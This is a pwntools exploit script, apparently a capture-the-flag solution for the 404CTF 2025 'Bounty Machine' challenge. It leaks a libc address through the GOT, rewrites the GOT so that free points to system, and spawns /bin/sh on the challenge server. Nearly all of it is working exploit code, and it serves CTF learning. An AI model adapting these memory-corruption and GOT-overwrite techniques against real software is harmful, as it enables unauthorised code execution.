#!/usr/bin/env python3

# Author: Pwnsard
# Challenge: Bounty Machine
# CTF: 404CTF 2025

from pwn import *

exe = ELF(b'data/chall')
libc = ELF(b'data/libc.so.6')
ld = ELF(b'data/ld-linux-x86-64.so.2')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        return r
    else:
        return remote('challenges.404ctf.fr', 31338)
    
def create_rocket(price: int, name: bytes, description: bytes):
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvuntil(b">>")
    r.sendline(str(price).encode('utf-8'))
    r.recvuntil(b">>")
    r.sendline(name)
    r.recvuntil(b">>")
    r.sendline(description)

def edit_rocket_price(price: int):
    r.recvuntil(b">")
    r.sendline(b"2")
    r.recvuntil(b">>")
    r.sendline(str(price).encode('utf-8'))

def edit_rocket_name(name: bytes):
    r.recvuntil(b">")
    r.sendline(b"3")
    r.recvuntil(b">>")
    r.sendline(name)

def edit_rocket_description(description: bytes):
    r.recvuntil(b">")
    r.sendline(b"4")
    r.recvuntil(b">>")
    r.sendline(description)

def display_rocket():
    r.recvuntil(b">")
    r.sendline(b"5")
    return r.recvuntil(b"----")

def free_rocket():
    r.recvuntil(b">")
    r.sendline(b"6")

def store_value_in_description(value: bytes):
    for i in range(9):
        edit_rocket_name(b"A" * 0x10 + b"B" * i)

    edit_rocket_name(b"A" * 0x10 + value)

def main():
    global r 
    r = conn()

    # Initialise first rocket
    create_rocket(76000, b"A" * 0x10, b"HRTC")

    # Leak the libc through the got
    store_value_in_description(p64(exe.got["printf"]))
    libc.address = int.from_bytes(display_rocket().split(b'Description : ')[1].split(b'\n---')[0], 'little') - 0x35b40
    print(f"libc@{hex(libc.address)}")

    # Overwrite got entry of the free function
    store_value_in_description(p64(0x405000))

    # We have to reproduce the got entirely, else our new line corrupts parts of the got which causes a crash
    got_payload = p64(libc.symbols['system'])
    got_payload += p64(libc.symbols['puts'])
    got_payload += p64(libc.symbols['strlen'])
    got_payload += p64(libc.symbols['printf'])
    got_payload += p64(libc.symbols['getchar'])
    got_payload += p64(libc.symbols['malloc'])
    got_payload += p64(libc.symbols['setvbuf'])
    got_payload += p64(libc.symbols['__isoc99_scanf'])
    edit_rocket_description(got_payload)

    # Description now points to /bin/sh
    bin_sh_addr = libc.address + 0x1b1ece
    store_value_in_description(p64(bin_sh_addr))

    # When freeing the /bin/sh rocket we now get a shell !
    free_rocket()

    r.interactive()

if __name__ == '__main__':
    main()